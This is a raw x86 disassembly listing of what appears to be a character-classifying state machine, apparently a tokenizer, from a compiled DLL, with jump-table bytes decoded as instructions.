mov ebx esi
mov [ eax ] 0x15
call sub_10073950
mov ecx [ ebp + 0x14 ]
push ecx
call sub_10073a80
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_1003fdd0
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0x10 ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
lea eax [ ebx - 0x9 ]
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0x10 ]
push eax
push edx
push esi
call sub_10016b30
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_10016b30
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10037120
lea eax [ edi + 0x94 ]
push eax
call sub_1004ac70
mov [ edi + 0x48 ] eax
mov eax [ ebp - 0x4 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp - 0x4 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_100755f0 ]
jmp [ edx * 4 + jump_table_100755e0 ]
call sub_10073b90
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10073b90
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10073b90
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_10073810
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100755f4
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_10075630
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax - 0x9 ]
push esi
push edi
cmp ecx 0x35
ja r-xdata
cmp eax 0x41
jl r-xdata
movzx ecx [ ecx + lookup_table_10075714 ]
jmp [ ecx * 4 + jump_table_1007570c ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp eax 0x5a
jle r-xdata
mov edx [ ebp + 0xc ]
add edx 0x20
push edx
push r--data
call sub_1006ad80
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
neg eax
sbb eax eax
and eax 0x7
add eax 0x15
mov [ ecx ] eax
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x10
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ ecx ] 0x15
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
add ecx 0x20
push ecx
push eax
push edi
call sub_10016b30
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x14
pop edi
mov eax 0x1
pop esi
pop ebp
retn
add eax 0x20
sub_10075716
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
int3
sub_10075750
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
movzx eax [ eax + lookup_table_10075824 ]
jmp [ eax * 4 + jump_table_10075810 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x1d
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x1f
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100736e0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ edx ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10075829
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_10075870
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x1c
movzx eax [ eax + lookup_table_1007594c ]
jmp [ eax * 4 + jump_table_10075938 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x1e
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x1f
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push 0x2
mov eax esi
mov [ edx ] 0x1c
call sub_10073350
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100736e0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ eax ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10075951
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_10075990
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3f
ja r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov [ edx ] 0x1c
movzx eax [ eax + lookup_table_10075a80 ]
jmp [ eax * 4 + jump_table_10075a68 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov [ edx ] 0x1f
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x5
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x1c
push 0x2
mov eax esi
call sub_10073350
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100736e0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ ecx ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
sub_10075a86
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add al [ 0x5050505 ]
add eax 0x5050505
add eax 0x3050505
add eax 0xec8b5504
cmp [ ebp + 0x10 ] 0x2f
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x1c
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add esi 0x20
push esi
push edi
mov [ eax ] 0x20
call sub_1004b8a0
push esi
push edi
call sub_10041660
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x18
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10075b30
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax - 0x9 ]
push esi
push edi
cmp ecx 0x35
ja r-xdata
cmp eax 0x41
jl r-xdata
movzx ecx [ ecx + lookup_table_10075c14 ]
jmp [ ecx * 4 + jump_table_10075c0c ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp eax 0x5a
jle r-xdata
mov edx [ ebp + 0xc ]
add edx 0x20
push edx
push r--data
call sub_1006ad80
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
neg eax
sbb eax eax
and eax 0xfffffff9
add eax 0x1c
mov [ ecx ] eax
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x10
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ ecx ] 0x1c
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
add ecx 0x20
push ecx
push eax
push edi
call sub_10016b30
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_1003c6e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100736e0
add esp 0x14
pop edi
mov eax 0x1
pop esi
pop ebp
retn
add eax 0x20
sub_10075c16
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
int3
sub_10075c50
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
lea eax [ esi + 0x1 ]
push edi
cmp eax 0x3f
ja r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ eax + lookup_table_10075d8c ]
jmp [ eax * 4 + jump_table_10075d70 ]
mov [ ebp + 0x10 ] esi
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
add esi 0x20
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edi [ ebp + 0x14 ]
push eax
mov [ ecx ] 0x0
call sub_10073810
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov [ edx ] 0x22
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0xfffd
push esi
call sub_10016b30
add esp 0x10
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0xf
mov eax ebx
call sub_10073350
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10073950
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0x10
mov eax ebx
call sub_10073350
add esp 0x4
jmp r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov edx [ ebp + 0x10 ]
push edi
push edx
push ebx
call sub_10016b30
add esp 0xc
lea ecx [ esi + 0x50 ]
push ecx
lea ebx [ esi + 0x94 ]
push ebx
call sub_10037120
push ebx
call sub_1004ac70
mov ebx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x48 ] eax
mov edx [ ebx + 0x8 ]
lea eax [ esi - 0x41 ]
mov [ edx ] 0x22
cmp eax 0x19
ja r-xdata
sub_10075d93
push es
push es
push es
add al [ edx ]
push es
add al [ esi ]
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add al [ esi ]
add eax [ esi ]
push es
push es
push es
add eax [ esi ]
push es
push es
push es
push es
push es
push es
add al 0x6
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add eax [ ebx ]
add eax 0xcccccccc
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
lea eax [ esi + 0x1 ]
push edi
cmp eax 0x3f
ja r-xdata
lea ecx [ esi - 0x41 ]
cmp ecx 0x19
ja r-xdata
movzx eax [ eax + r-xdata ]
jmp [ eax * 4 + r-xdata ]
mov edx [ ebp + 0x8 ]
mov [ ebp + 0x10 ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
add esi 0x20
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10073c90
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x23
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10073c90
mov edx [ esi + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10073c90
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x24
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10073c90
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ ecx ] 0x0
call sub_10073810
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov edi [ ebp + 0x8 ]
push 0x2
mov eax edi
call sub_10073350
mov esi [ edi + 0x8 ]
mov edx [ r--data ]
lea ebx [ esi + 0x3c ]
add esp 0x4
cmp [ ebx + 0x4 ] 0x0
mov [ ebp + 0x10 ] edx
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x10
call sub_10073350
add esp 0x4
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push edi
push ecx
push edx
call sub_10016b30
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea eax [ esi + 0x50 ]
push eax
lea ebx [ esi + 0x94 ]
push ebx
call sub_10037120
push ebx
call sub_1004ac70
add esp 0xc
mov [ esi + 0x48 ] eax
mov edx [ ebp + 0x10 ]
push ebx
push edx
push edi
call sub_10016b30
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push ecx
push eax
call sub_10037120
lea eax [ esi + 0x94 ]
push eax
call sub_1004ac70
add esp 0xc
mov [ esi + 0x48 ] eax
sub_10075ecc
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov [ eax ] 0x0
call sub_10073950
push 0xf
mov eax ebx
call sub_10073350
add esp 0x4
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
sub_10075f7c
pop es
pop es
add al [ edx ]
pop es
add al [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add al [ edi ]
add eax [ edi ]
pop es
pop es
pop es
add eax [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
add al 0x7
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add eax [ 0xffffffffcccccc06 ]
int3
sub_10075fc0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
lea eax [ esi + 0x1 ]
push edi
cmp eax 0x3f
ja r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ eax + lookup_table_10076118 ]
jmp [ eax * 4 + jump_table_100760f8 ]
mov [ ebp + 0x10 ] esi
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
add esi 0x20
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x24
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov edi [ ebp + 0x14 ]
push eax
mov [ edx ] 0x0
call sub_10073810
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov [ eax ] 0x22
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0xfffd
push esi
call sub_10016b30
add esp 0x10
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0xf
mov eax ebx
call sub_10073350
mov edx [ ebx + 0x8 ]
add esp 0x4
mov [ edx ] 0x0
call sub_10073950
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0x10
mov eax ebx
call sub_10073350
add esp 0x4
jmp r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x10 ]
push edi
push eax
push ebx
call sub_10016b30
add esp 0xc
lea edx [ esi + 0x50 ]
push edx
lea ebx [ esi + 0x94 ]
push ebx
call sub_10037120
push ebx
call sub_1004ac70
mov ebx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x48 ] eax
mov eax [ ebx + 0x8 ]
lea ecx [ esi - 0x41 ]
mov [ eax ] 0x22
cmp ecx 0x19
ja r-xdata
sub_10076120
pop es
pop es
add al [ edx ]
pop es
add al [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add al [ edi ]
add eax [ edi ]
pop es
pop es
pop es
add eax [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
add al 0x7
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add eax [ 0xffffffffcccccc06 ]
int3
sub_10076160
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
push esi
inc eax
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0x61
ja r-xdata
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x27
mov ebx [ edi + 0x8 ]
add ebx 0x3c
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
movzx eax [ eax + lookup_table_1007631c ]
jmp [ eax * 4 + jump_table_100762f8 ]
mov eax [ ebp + 0x10 ]
push ebx
push eax
push edi
call sub_10016b30
add esp 0xc
mov esi [ edi + 0x8 ]
lea edx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push edx
push eax
call sub_10037120
lea eax [ esi + 0x94 ]
push eax
call sub_1004ac70
add esp 0xc
mov [ esi + 0x48 ] eax
mov eax edi
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x25
call sub_10073510
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax [ edx + 0x8 ]
pop edi
mov [ eax ] 0x27
pop esi
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
mov eax edi
mov edx [ eax + 0x8 ]
mov [ edx ] 0x26
call sub_10073510
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov esi edi
push 0x2
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov [ eax ] 0x27
mov edi [ esi + 0x8 ]
mov ecx [ r--data ]
add edi 0x3c
add esp 0x4
cmp [ edi + 0x4 ] 0x0
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov ebx edi
push 0x13
mov eax ebx
call sub_10073350
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10073950
mov edx [ ebp + 0xc ]
pop edi
pop esi
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
mov esi edi
push 0x14
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ eax ] 0x0
call sub_10073810
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
push 0x15
mov eax edi
call sub_10073350
add esp 0x4
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x10 ]
push edi
push eax
push esi
call sub_10016b30
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ esi + 0x8 ]
lea edx [ ebx + 0x50 ]
lea eax [ ebx + 0x94 ]
push edx
push eax
call sub_10037120
lea eax [ ebx + 0x94 ]
push eax
call sub_1004ac70
add esp 0xc
mov [ ebx + 0x48 ] eax
sub_10076325
or [ edx ] al
add cl [ eax ]
add cl [ eax ]
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
add cl [ eax ]
add ecx [ eax ]
or [ eax ] cl
add al 0x5
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
push es
push es
pop es
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ esi ] al
int3
sub_10076380
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
cmp eax 0x27
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x3c
push edx
push ecx
push eax
call sub_10016b30
add esp 0xc
mov eax 0x2
pop ebp
retn
movzx eax [ eax + lookup_table_10076460 ]
jmp [ eax * 4 + jump_table_1007644c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x29
mov eax 0x2
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x6c ] ecx
mov ecx [ edx + 0x8 ]
mov [ ecx ] 0x28
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x3c
push edx
push eax
push esi
call sub_10016b30
add esp 0x10
pop esi
mov eax 0x2
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push 0x11
mov eax ebx
call sub_10073350
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10073950
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x1
pop ebx
mov eax 0x2
pop ebp
retn
sub_10076465
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x3
int3
sub_10076490
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
cmp eax 0x28
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x3c
push edx
push ecx
push eax
call sub_10016b30
add esp 0xc
mov eax 0x2
pop ebp
retn
movzx eax [ eax + lookup_table_10076570 ]
jmp [ eax * 4 + jump_table_1007655c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x29
mov eax 0x2
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x6c ] ecx
mov ecx [ edx + 0x8 ]
mov [ ecx ] 0x28
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x3c
push edx
push eax
push esi
call sub_10016b30
add esp 0x10
pop esi
mov eax 0x2
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push 0x12
mov eax ebx
call sub_10073350
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10073950
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x1
pop ebx
mov eax 0x2
pop ebp
retn
sub_10076575
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ ebx ]
int3
sub_100765a0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
inc eax
push esi
push edi
cmp eax 0x61
ja r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
movzx eax [ eax + lookup_table_10076724 ]
jmp [ eax * 4 + jump_table_10076708 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push edi
push edx
push eax
call sub_10016b30
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ esi + 0x50 ]
push ecx
lea ebx [ esi + 0x94 ]
push ebx
call sub_10037120
push ebx
call sub_1004ac70
add esp 0xc
mov [ esi + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x21
call sub_10073e90
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x6c ] edx
mov edx [ ecx + 0x8 ]
pop edi
mov [ edx ] 0x28
pop esi
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax esi
call sub_10073e90
mov edi [ ebp + 0x14 ]
push esi
call sub_10073810
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov edi [ ebp + 0x8 ]
push 0x2
mov eax edi
call sub_10073350
mov esi [ edi + 0x8 ]
mov ecx [ r--data ]
